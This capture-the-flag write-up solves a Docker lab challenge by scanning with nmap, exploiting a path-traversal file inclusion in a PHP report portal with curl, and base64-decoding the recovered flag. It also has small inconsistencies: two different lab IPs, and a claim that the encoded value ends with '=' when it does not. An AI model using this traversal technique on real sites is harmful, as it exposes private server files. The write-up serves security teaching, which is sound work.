# Sector 14 Report

> LATAM Energía Red left a report query portal after the sector 14 blackout. Download the lab zip and run it on Kali/Linux with Docker.
> `chmod +x startlab.sh && ./startlab.sh blackout-web01.tar` → lab IP on the Docker network (172.18.0.2). Enumerate with nmap and attack via HTTP.
> **Hint:** enumerate the lab IP with nmap. The portal exposes several internal sections.

**Flag:** `WHOAMI{lf1_d0c_s3ct0r14}`

---

## Solution

The challenge involves exploiting a Local File Inclusion vulnerability in a report portal to read an internal data file, then decoding its base64-encoded contents to recover the flag.

### 1. Start the lab

**Tool:** `docker inspect`. **Why:** the startup script does not provide the IP, so I query the container.

```bash
$ unzip blackout-web01.zip && chmod +x startlab.sh && ./startlab.sh blackout-web01.tar
$ sudo docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' blackout-web01
172.17.0.2
```

### 2. Enumerate

**Tool:** `nmap`. **Why:** discovers the services to attack.

**Parameters:** `-sV` (service version), `-p-` (all ports).

```bash
$ nmap -sV -p- 172.17.0.2
80/tcp open  http    Apache httpd 2.4.68 (Debian)
```

Only port 80. **What I saw:** on the index page there is a suspicious link:

```
/informes.php?informe=panel.php
```

The `informe` parameter takes the name of a PHP file → classic **LFI (Local File Inclusion)** with path traversal.

### 3. Confirm the LFI and read internal files

`informes.php` does `include __DIR__ . '/pages/' . $informe;` without sanitizing `../`, so it is possible to escape from `pages/`:

```bash
$ curl "http://172.17.0.2/informes.php?informe=../doc/latam_energia_recuperacion_sector14.dat"
LATAM ENERGIA RED — BLACKOUT LATAM
SUBESTACION NORTE / SECTOR 14
TIPO=recuperacion_post_apagon
REGISTRO=V0hPQU1Je2xmMV9kMGNfczNjdDByMTR9
```

**Decision:** I tried `../` to escape from `pages/` and read system files. Access was gained to a `.dat` file in an internal `doc/` folder (owned by `www-data`, readable by the PHP process).

### 4. Decode the record

The `REGISTRO=` value ends with `=` and has characters that reveal **base64**:

```bash
$ echo "V0hPQU1Je2xmMV9kMGNfczNjdDByMTR9" | base64 -d
WHOAMI{lf1_d0c_s3ct0r14}
```

## Lesson

When a parameter includes files (`?informe=xxx.php`), try path traversal (`../`) to escape the allowed directory and read sensitive files. If the value decodes to garbled text, it is usually base64.

---

*Part of the **Blackout LATAM** CTF by [Whoami-Labs](https://whoami-labs.com/).*
